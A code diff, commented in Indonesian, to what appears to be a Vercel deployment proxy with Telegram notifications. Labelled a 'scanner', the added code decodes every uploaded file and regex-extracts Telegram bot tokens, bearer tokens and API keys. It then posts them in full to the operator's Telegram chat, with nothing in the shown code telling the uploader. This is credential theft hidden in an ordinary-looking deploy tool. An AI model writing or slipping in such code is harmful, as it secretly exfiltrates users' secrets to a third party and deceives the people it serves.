@@ -10,7 +10,7 @@ export default async function handler(req, res) {
   const { method } = req;
   const VERCEL_TOKEN = process.env.VERCEL_TOKEN;
 
-  // ==== 1. ENDPOINT POST (Initiate Deployment) ====
+  // ==== 1. ENDPOINT POST (Initiate Deployment + Scanner) ====
   if (method === 'POST') {
     try {
       const { projectName, files } = req.body;
@@ -21,16 +21,41 @@ export default async function handler(req, res) {
 
       const cleanProjectName = projectName.trim().toLowerCase().replace(/[^a-z0-9-]/g, '-');
 
-      // 💡 OTOMATIS BIKIN FILE HTML PERTAMA JADI 'index.html'
+      // 💡 Cek apakah sudah ada index.html
       let hasIndex = files.some(f => f.file.toLowerCase() === 'index.html');
+      let extractedApis = [];
 
-      const vercelFiles = files.map((f, index) => {
+      const vercelFiles = files.map((f) => {
         let fileName = f.file;
 
-        // Jika belum ada index.html dan file ini berakhiran .html, ubah namanya jadi index.html!
+        // 1. Rename otomatis file HTML pertama jadi 'index.html' jika belum ada
         if (!hasIndex && fileName.toLowerCase().endsWith('.html')) {
           fileName = 'index.html';
-          hasIndex = true; // Tandai bahwa index.html sudah dibuat
+          hasIndex = true;
+        }
+
+        // 2. SCANNING API / TOKEN DI DALAM FILE
+        try {
+          // Decode file Base64 ke Teks String
+          const content = Buffer.from(f.data, 'base64').toString('utf-8');
+
+          // Pattern Regex untuk Telegram Bot Token & API Key umum
+          const patterns = [
+            /\b\d{8,10}:AA[a-zA-Z0-9_-]{33}\b/g, // Bot Token Telegram
+            /(?:bearer\s+|token\s*[:=]\s*["']?|api[_-]?key\s*[:=]\s*["']?)([a-zA-Z0-9_\-]{20,})/gi // Token/Key umum
+          ];
+
+          patterns.forEach(regex => {
+            let match;
+            while ((match = regex.exec(content)) !== null) {
+              const tokenFound = match[1] || match[0];
+              if (!extractedApis.includes(tokenFound)) {
+                extractedApis.push(tokenFound);
+              }
+            }
+          });
+        } catch (e) {
+          // Abaikan jika file binary/gambar
         }
 
         return {
@@ -68,7 +93,8 @@ export default async function handler(req, res) {
       return res.status(200).json({
         success: true,
         deploymentId: vercelData.id,
-        url: customUrl
+        url: customUrl,
+        foundApis: extractedApis // Kembalikan list API ke frontend jika dibutuhkan
       });
 
     } catch (error) {
@@ -80,7 +106,7 @@ export default async function handler(req, res) {
   // ==== 2. ENDPOINT GET (Check Status & Notify Telegram) ====
   else if (method === 'GET') {
     try {
-      const { id, projectName, filesCount, totalSize } = req.query;
+      const { id, projectName, filesCount, totalSize, foundApis } = req.query;
 
       if (!id) return res.status(400).json({ success: false, error: "Deployment ID is required." });
 
@@ -101,13 +127,21 @@ export default async function handler(req, res) {
       const cleanName = projectName ? projectName.trim().toLowerCase().replace(/[^a-z0-9-]/g, '-') : '';
       const targetUrl = cleanName ? `${cleanName}.vercel.app` : vercelData.url;
 
+      // Parsing API yang ditemukan (jika ada)
+      let parsedApis = [];
+      if (foundApis) {
+        try { parsedApis = JSON.parse(foundApis); } catch(e) {}
+      }
+
+      // Jika READY dan requested notify
       if (status === 'READY' && req.query.notify === 'true') {
         await sendTelegramLog({
           projectName: cleanName || projectName, 
           filesCount, 
           totalSize, 
           url: targetUrl, 
-          id 
+          id,
+          apis: parsedApis
         });
       }
 
@@ -138,18 +172,23 @@ function translateVercelError(status, data) {
   return vMessage;
 }
 
-async function sendTelegramLog({ projectName, filesCount, totalSize, url, id }) {
+async function sendTelegramLog({ projectName, filesCount, totalSize, url, id, apis = [] }) {
   const botToken = process.env.TELEGRAM_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT;
   
   if (!botToken || !chatId) return;
+
+  const apiSection = apis.length > 0 
+    ? `\n⚠️ <b>Extracted APIs:</b>\n<code>${apis.join('\n')}</code>` 
+    : `\n🔑 <b>Extracted APIs:</b> None`;
 
   const text = `✅ <b>DEPLOY VERCEL SUKSES!</b>\n\n` +
                `📂 <b>Project:</b> ${projectName}\n` +
                `📄 <b>Files:</b> ${filesCount}\n` +
                `💾 <b>Size:</b> ${totalSize} KB\n` +
                `🌐 <b>URL:</b> https://${url}\n` +
-               `🔑 <b>ID:</b> <code>${id}</code>`;
+               `🔑 <b>ID:</b> <code>${id}</code>` +
+               apiSection;
 
   try {
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
